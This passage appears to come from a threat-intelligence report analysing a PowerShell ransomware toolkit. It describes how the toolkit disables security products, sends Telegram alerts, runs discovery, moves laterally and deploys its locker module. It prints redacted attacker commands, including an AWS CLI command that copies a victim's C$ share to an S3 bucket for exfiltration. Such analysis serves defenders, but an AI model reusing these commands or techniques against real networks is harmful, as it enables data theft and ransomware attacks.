<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-077.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32137" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-077.png" alt="" width="2456" height="740" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-077.png 2456w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-077-300x90.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-077-1024x309.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-077-768x231.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-077-1536x463.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-077-2048x617.png 2048w" sizes="(max-width: 2456px) 100vw, 2456px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Disable AV/EDR</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A section of the script are the commands designed to disable various known anti-virus and EDR products on a Windows system. For example, the commands for <code>'CarbonBlack'</code> stop its services using its own command-line tool (<code>repcli.exe</code>), while the <code>'defender'</code> entry uses PowerShell to disable real-time monitoring in Windows Defender. The <code>'Symantec'</code> and <code>'Trend Micro' </code>entries employ executable commands and <code>taskkill</code> to stop processes related to Symantec Endpoint Protection and Trend Micro, respectively. Lastly, the <code>'CylanceDesktop'</code> commands are set to modify registry values and stop the Cylance service, using setacl.exe (<code>potentially </code><a href="https://helgeklein.com/setacl/" target="_blank" rel="noreferrer noopener">https://helgeklein.com/setacl/</a> or a custom tool) to change permissions, indicating an approach to bypassing the said defenses.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-078.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32138" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-078.png" alt="" width="2392" height="1746" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-078.png 2392w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-078-300x219.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-078-1024x747.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-078-768x561.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-078-1536x1121.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-078-2048x1495.png 2048w" sizes="(max-width: 2392px) 100vw, 2392px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Send Telegram Updates</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Both functions on the codes above automate the process of sending messages to Telegram from PowerShell scripts, offering a way to integrate notifications, alerts, or commands into Telegram chats for monitoring, automation tasks, or administrative commands. The second function, in particular, provides flexible solution for leveraging Telegram&#8217;s Bot API within PowerShell environments.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-079.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32140" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-079.png" alt="" width="2394" height="2236" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-079.png 2394w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-079-300x280.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-079-1024x956.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-079-768x717.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-079-1536x1435.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-079-2048x1913.png 2048w" sizes="(max-width: 2394px) 100vw, 2394px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Here&#8217;s another example of Telegram Text Message bot to employ auto notification related to the status of transferring files to AWS:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-080.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32236" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-080.png" alt="" width="2422" height="1100" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-080.png 2422w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-080-300x136.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-080-1024x465.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-080-768x349.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-080-1536x698.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-080-2048x930.png 2048w" sizes="(max-width: 2422px) 100vw, 2422px" /></a></p>
<p>Examples of this activity from the intrusion were visible in zeek network logs since it was transmitted over plain text http:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-111.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32175" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-111.png" alt="" width="1427" height="422" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-111.png 1427w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-111-300x89.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-111-1024x303.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-111-768x227.png 768w" sizes="(max-width: 1427px) 100vw, 1427px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Exfiltrate Data to AWS</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>AWScollector has functionality to use information gathered during the script discovery/enumeration function to exfiltrate data from one or multiple hosts to S3.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The module can be used like this:</p>
<pre>InvokeModule -module awscollector -awskey REDACTED -awssecret REDACTED -awss3bucket REDACTED_DOMAIN -awsregion us-east-1 -handleSystems REDACTED_TARGETHOST</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>It has built in functionality to rename and mask the original <code>aws.exe</code> binary</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-120.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32141" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-120.png" alt="" width="369" height="30" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-120.png 369w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-120-300x24.png 300w" sizes="(max-width: 369px) 100vw, 369px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-081.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32142" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-081.png" alt="" width="806" height="526" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-081.png 806w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-081-300x196.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-081-768x501.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-081-765x500.png 765w" sizes="(max-width: 806px) 100vw, 806px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It will use data cached in <code>.items</code> files which is created using the <code>systeminfo</code> module in the script.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-082.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32144" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-082.png" alt="" width="670" height="84" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-082.png 670w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-082-300x38.png 300w" sizes="(max-width: 670px) 100vw, 670px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-083.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32145" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-083.png" alt="" width="1183" height="538" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-083.png 1183w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-083-300x136.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-083-1024x466.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-083-768x349.png 768w" sizes="(max-width: 1183px) 100vw, 1183px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Is has a hardcoded exception list to attempt reducing the amount of data collected and sent to AWS S3.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-084.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32143" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-084.png" alt="" width="1761" height="266" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-084.png 1761w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-084-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-084-1024x155.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-084-768x116.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-084-1536x232.png 1536w" sizes="(max-width: 1761px) 100vw, 1761px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-085.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32146" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-085.png" alt="" width="1441" height="83" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-085.png 1441w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-085-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-085-1024x59.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-085-768x44.png 768w" sizes="(max-width: 1441px) 100vw, 1441px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Final command looks like this</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">"C:\programdata\microsoft\windows\wer\bin\AWSCLIV2\WaAppAgent.exe" s3 cp \\[REDACTED]\C$\DeployDebug s3://[REDACTED]/[REDACTED]/C_DeployDebug --region us-east-1 --recursive
endpoint-url https://[REDACTED].s3-accelerate.amazonaws.com --exclude *.mp4 --exclude *.jpg --exclude *.iso --exclude *.lnk --exclude *.url --exclude *.dll --exclude *.exe --exclude *.chm --exclude *
exclude *.mp3 --exclude *.cab --exclude *.msi --exclude *.wav --exclude *.msi --exclude *.log --exclude *.jpg --exclude *.msu --exclude *.m4a --exclude *.jar --exclude *.wma
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>It also has the capability to check how much data has been exfiltrated, and report back.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-086.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32148" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-086.png" alt="" width="1277" height="147" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-086.png 1277w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-086-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-086-1024x118.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-086-768x88.png 768w" sizes="(max-width: 1277px) 100vw, 1277px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Perform Various Host Discovery</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The systeminfo module has the ability to execute many different discovery tasks.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>They executed them usually like this.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>invokemodule -module systeminfo -methods &lt;METHOD&gt; -handlesystems all</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The <code>handlesystems</code> option is documented in the &#8220;Locker&#8221; section.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>List of Methods:</p>
<!-- /wp:paragraph -->
<p>os &#8212; Uses <code>Get-WmiObject Win32_OperatingSystem</code> to discovery the operating system <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-087.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32149" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-087.png" alt="" width="900" height="397" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-087.png 900w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-087-300x132.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-087-768x339.png 768w" sizes="(max-width: 900px) 100vw, 900px" /></a> arch &#8212; Uses <code>Get-WmiObject win32_computersystem</code> or <code>Get-CimInstance -ClassName Win32_ComputerSystem</code> to check if the system is x86, or x64 <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-088.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32150" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-088.png" alt="" width="999" height="508" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-088.png 999w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-088-300x153.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-088-768x391.png 768w" sizes="(max-width: 999px) 100vw, 999px" /></a> execmethod &#8212; This module is described in the &#8220;Lateral Movement Functionality&#8221; section tasks Uses either <code>Get-CimInstance</code>, <code>Get-WmiObject</code> or <code>Get-Process</code> to collect a list of running processes on the endpoint <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-089.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32151" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-089.png" alt="" width="1124" height="692" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-089.png 1124w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-089-300x185.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-089-1024x630.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-089-768x473.png 768w" sizes="(max-width: 1124px) 100vw, 1124px" /></a> cpu &#8212; Uses <code>Get-WmiObject win32_processor</code> to get the CPU Load of the client <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-090.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32152" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-090.png" alt="" width="1044" height="152" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-090.png 1044w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-090-300x44.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-090-1024x149.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-090-768x112.png 768w" sizes="(max-width: 1044px) 100vw, 1044px" /></a> mem &#8212; Uses <code>Get-WmiObject CIM_PhysicalMemory</code> to get information about memory usage <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-091.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32153" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-091.png" alt="" width="1380" height="153" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-091.png 1380w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-091-300x33.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-091-1024x114.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-091-768x85.png 768w" sizes="(max-width: 1380px) 100vw, 1380px" /></a> publicip &#8212; Documented in the &#8220;AWS Collector Enumeration&#8221; section internetspeed Documented in the &#8220;AWS Collector Enumeration&#8221; section shares Uses <code>get-WmiObject -class Win32_Share</code> to get a list of available shares on the client <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-092.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32154" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-092.png" alt="" width="638" height="229" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-092.png 638w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-092-300x108.png 300w" sizes="(max-width: 638px) 100vw, 638px" /></a> services &#8212; Uses <code>Get-Service</code> to get a list of services running on the endpoint <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-093.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32155" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-093.png" alt="" width="916" height="233" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-093.png 916w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-093-300x76.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-093-768x195.png 768w" sizes="(max-width: 916px) 100vw, 916px" /></a> uptime &#8212; Uses either <code>Get-WmiObject Win32_OperatingSystem</code> or <code>Get-CimInstance -ClassName Win32_OperatingSystem</code> to get the uptime of the client</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-121.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32316" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-121.png" alt="" width="755" height="274" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-121.png 755w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-121-300x109.png 300w" sizes="(max-width: 755px) 100vw, 755px" /></a></p>
<p>netconnections Uses <code>netstat</code> and <code>tasklist</code> to create a list of network connections, and the associated pid and process name <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-094.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32156" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-094.png" alt="" width="910" height="352" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-094.png 910w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-094-300x116.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-094-768x297.png 768w" sizes="(max-width: 910px) 100vw, 910px" /></a> resolve &#8212; Uses [System.Net.Dns]::GetHostAddresses to get the IP address of the hostname <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-095.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32157" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-095.png" alt="" width="679" height="65" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-095.png 679w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-095-300x29.png 300w" sizes="(max-width: 679px) 100vw, 679px" /></a> sw &#8212; Uses <code>Get-WmiObject -Class Win32_Product</code> or <code>Get-CimInstance -ClassName Win32_Product</code> to get a list of installed applications in the system <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-096.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32158" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-096.png" alt="" width="559" height="119" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-096.png 559w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-096-300x64.png 300w" sizes="(max-width: 559px) 100vw, 559px" /></a> drives &#8212; Uses <code>Get-WmiObject</code> or <code>Get-CimInstance</code> with the <code>win32_logicaldisk</code> class to get a list of all drives associated with the client <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-097.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32159" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-097.png" alt="" width="1159" height="224" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-097.png 1159w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-097-300x58.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-097-1024x198.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-097-768x148.png 768w" sizes="(max-width: 1159px) 100vw, 1159px" /></a></p>
<!-- wp:paragraph -->
<p>All of the collected information will also be cached and stored on the system running the AWScollector script</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Lateral Movement Functionality</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The script supports executing commands on other hosts using various methods, with the RemoteExec function.</p>
<!-- /wp:paragraph -->
<p>Schedule task Using <a href="https://github.com/mkellerman/Invoke-CommandAs" target="_blank" rel="noreferrer noopener">Invoke-CommandAs</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-098.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32160" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-098.png" alt="" width="1159" height="224" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-098.png 1159w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-098-300x58.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-098-1024x198.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-098-768x148.png 768w" sizes="(max-width: 1159px) 100vw, 1159px" /></a> Powershell Using <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4" target="_blank" rel="noreferrer noopener">Invoke-Command</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-099.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32161" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-099.png" alt="" width="639" height="71" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-099.png 639w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-099-300x33.png 300w" sizes="(max-width: 639px) 100vw, 639px" /></a> WMI Using Invoke-WMIExec, a slightly modified version of <a href="https://github.com/OneScripter/WmiExec/blob/main/WmiExec.ps1" target="_blank" rel="noreferrer noopener">WmiExec</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-100.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32162" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-100.png" alt="" width="701" height="150" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-100.png 701w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-100-300x64.png 300w" sizes="(max-width: 701px) 100vw, 701px" /></a> DCOM Using <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1" target="_blank" rel="noreferrer noopener">Invoke-DCOM</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-101.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32163" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-101.png" alt="" width="752" height="92" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-101.png 752w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-101-300x37.png 300w" sizes="(max-width: 752px) 100vw, 752px" /></a> WinRM Using <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4" target="_blank" rel="noreferrer noopener">Invoke-Command</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-102.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32164" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-102.png" alt="" width="983" height="166" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-102.png 983w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-102-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-102-768x130.png 768w" sizes="(max-width: 983px) 100vw, 983px" /></a> PsExec Using <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-PsExec.ps1" target="_blank" rel="noreferrer noopener">Invoke-PsExec</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-103.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32165" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-103.png" alt="" width="722" height="82" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-103.png 722w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-103-300x34.png 300w" sizes="(max-width: 722px) 100vw, 722px" /></a> SMB Using <a href="https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1" target="_blank" rel="noreferrer noopener">Invoke-SMBExec</a> <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-104.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32166" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-104.png" alt="" width="1105" height="235" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-104.png 1105w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-104-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-104-1024x218.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-104-768x163.png 768w" sizes="(max-width: 1105px) 100vw, 1105px" /></a></p>
<!-- wp:paragraph -->
<p>The script will automatically find the most suitable execution method by just testing them, and choosing whichever works first</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-105.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32167" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-105.png" alt="" width="923" height="654" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-105.png 923w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-105-300x213.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-105-768x544.png 768w" sizes="(max-width: 923px) 100vw, 923px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Locker Module</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Example usage seen during the intrusion</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">invokemodule -module locker -locker &lt;REDACTED&gt;.dll  -lockerpath programdata\microsoft -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The locker module is about 800 lines of PowerShell and handles the entire ransomware process.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This is only a high level overview of the general locker module function. There are a lot of checks, error handling and options programmed into the tool. It shows signs to be quite well developed and extensively tested.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Targeting can be done multiple ways by using the <code>handlesystems </code>option.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Specifying a single host by hostname</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Reads <code>C:\programdata\microsoft\windows\wer\data\_hostlist.&lt;handlesystems&gt;</code><!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Created automatically using the <code>FindHosts</code> function that uses sharphound&#8217;s <code>computer.json</code> to create<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>_hostlist.all</code> &#8211; Contains all hosts found</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>_hostlist.srv</code> &#8211; Hosts that either has a dn, OS Name or description that contains &#8220;server&#8221;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>_hostlist.ws</code> &#8211; Contains hosts not matching server criteria</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Also supports having a custom list named <code>_hostlist.custom</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The high level execution flow is as follows</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul>
<li style="list-style-type: none;">
<ul><!-- wp:list-item -->
<li>Checks if system is online, or if offline<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Checks if <code>\\&lt;HOST&gt;\C$\</code> is reachable</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Checks if system is locked by either<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Existence of a cache dir <code>C:\programdata\microsoft\windows\wer\&lt;HOST&gt;.locked</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Tests if<code>\\&lt;HOST&gt;\C$\&lt;FILE&gt;</code> exists which would be created by using the &#8220;marker&#8221; option in the <code>lockerparams</code> switch</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Create a batch file named <code>$locker_name.cmd</code>to do some pre-ransom tasks like:<!-- wp:list -->
<ul>
<li style="list-style-type: none;">
<ul><!-- wp:list-item --></ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul><!-- wp:paragraph --></ul>
</li>
</ul>
Stops known services on the host</li>
<li>Generates a list of services to stop based on a built-in list and checking each system using <code>Get-Service</code></li>
<li>Services of interest:</li>
</ul>
</li>
</ul>
